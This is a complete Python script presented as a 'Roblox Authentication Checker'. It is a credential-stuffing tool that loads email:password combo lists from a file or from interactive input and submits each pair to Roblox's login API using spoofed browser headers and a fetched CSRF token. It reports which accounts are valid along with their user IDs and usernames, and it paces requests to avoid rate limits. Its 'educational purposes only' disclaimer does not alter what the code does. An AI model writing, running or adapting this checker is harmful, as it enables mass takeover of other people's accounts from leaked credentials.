#!/usr/bin/env python3
"""
Roblox Authentication Checker
A Python script for checking Roblox account credentials without any stimulation or automated actions.
This script is for educational purposes only.
"""

import requests
import json
import time
import sys
from typing import Dict, Optional, Tuple
import urllib3

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class RobloxAuthChecker:
    def __init__(self):
        self.session = requests.Session()
        self.base_url = "https://auth.roblox.com"
        self.api_url = "https://api.roblox.com"
        
        # Standard headers for Roblox requests
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Content-Type': 'application/json',
            'Origin': 'https://www.roblox.com',
            'Referer': 'https://www.roblox.com/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site',
            'X-CSRF-TOKEN': '',
            'X-Requested-With': 'XMLHttpRequest'
        }
        
        # Update session headers
        self.session.headers.update(self.headers)
        
    def get_csrf_token(self) -> Optional[str]:
        """Get CSRF token from Roblox"""
        try:
            response = self.session.post(f"{self.base_url}/v2/login", json={})
            if 'X-CSRF-TOKEN' in response.headers:
                return response.headers['X-CSRF-TOKEN']
        except Exception as e:
            print(f"Error getting CSRF token: {e}")
        return None
    
    def create_login_payload(self, email: str, password: str) -> Dict:
        """Create login payload for Roblox authentication"""
        return {
            "ctype": "Username",
            "cvalue": email,
            "password": password
        }
    
    def check_credentials(self, email: str, password: str) -> Tuple[bool, Dict]:
        """
        Check if Roblox credentials are valid
        Returns: (is_valid, response_data)
        """
        try:
            # Get CSRF token
            csrf_token = self.get_csrf_token()
            if not csrf_token:
                return False, {"error": "Failed to get CSRF token"}
            
            # Update headers with CSRF token
            self.session.headers['X-CSRF-TOKEN'] = csrf_token
            
            # Create login payload
            payload = self.create_login_payload(email, password)
            
            # Make login request
            response = self.session.post(
                f"{self.base_url}/v2/login",
                json=payload,
                timeout=10
            )
            
            response_data = {
                "status_code": response.status_code,
                "headers": dict(response.headers),
                "response": response.text
            }
            
            # Check if login was successful
            if response.status_code == 200:
                try:
                    json_response = response.json()
                    if json_response.get("user") and json_response.get("user").get("id"):
                        return True, {
                            "success": True,
                            "user_id": json_response["user"]["id"],
                            "username": json_response["user"].get("name", "Unknown"),
                            "display_name": json_response["user"].get("displayName", "Unknown"),
                            "response": response_data
                        }
                except json.JSONDecodeError:
                    pass
            
            # Check for specific error messages
            if response.status_code == 403:
                try:
                    error_data = response.json()
                    if "errors" in error_data:
                        error_msg = error_data["errors"][0].get("message", "Unknown error")
                        return False, {
                            "success": False,
                            "error": error_msg,
                            "response": response_data
                        }
                except json.JSONDecodeError:
                    pass
            
            return False, {
                "success": False,
                "error": f"Login failed with status code: {response.status_code}",
                "response": response_data
            }
            
        except requests.exceptions.Timeout:
            return False, {"error": "Request timeout"}
        except requests.exceptions.ConnectionError:
            return False, {"error": "Connection error"}
        except Exception as e:
            return False, {"error": f"Unexpected error: {str(e)}"}
    
    def check_single_credential(self, email: str, password: str) -> None:
        """Check a single email:password combination"""
        print(f"Checking: {email}")
        
        is_valid, result = self.check_credentials(email, password)
        
        if is_valid:
            print(f"✅ VALID - User ID: {result.get('user_id')}, Username: {result.get('username')}")
        else:
            error_msg = result.get('error', 'Unknown error')
            print(f"❌ INVALID - {error_msg}")
        
        # Add delay to avoid rate limiting
        time.sleep(1)
    
    def check_credentials_from_file(self, file_path: str) -> None:
        """Check credentials from a file (email:password format)"""
        try:
            with open(file_path, 'r', encoding='utf-8') as file:
                lines = file.readlines()
            
            print(f"Loaded {len(lines)} credentials from {file_path}")
            print("-" * 50)
            
            for line_num, line in enumerate(lines, 1):
                line = line.strip()
                if not line or ':' not in line:
                    continue
                
                try:
                    email, password = line.split(':', 1)
                    self.check_single_credential(email.strip(), password.strip())
                except ValueError:
                    print(f"❌ Invalid format on line {line_num}: {line}")
                
                print("-" * 30)
                
        except FileNotFoundError:
            print(f"❌ File not found: {file_path}")
        except Exception as e:
            print(f"❌ Error reading file: {e}")

def main():
    """Main function"""
    print("Roblox Authentication Checker")
    print("=" * 40)
    print("⚠️  This script is for educational purposes only")
    print("⚠️  Use responsibly and respect Roblox's Terms of Service")
    print("=" * 40)
    
    checker = RobloxAuthChecker()
    
    if len(sys.argv) > 1:
        # Check credentials from file
        file_path = sys.argv[1]
        checker.check_credentials_from_file(file_path)
    else:
        # Interactive mode
        print("Enter credentials to check (or 'quit' to exit):")
        
        while True:
            try:
                user_input = input("\nEmail:Password (or 'quit'): ").strip()
                
                if user_input.lower() in ['quit', 'exit', 'q']:
                    break
                
                if ':' not in user_input:
                    print("❌ Invalid format. Use email:password")
                    continue
                
                email, password = user_input.split(':', 1)
                checker.check_single_credential(email.strip(), password.strip())
                
            except KeyboardInterrupt:
                print("\n\nExiting...")
                break
            except Exception as e:
                print(f"❌ Error: {e}")

if __name__ == "__main__":
    main()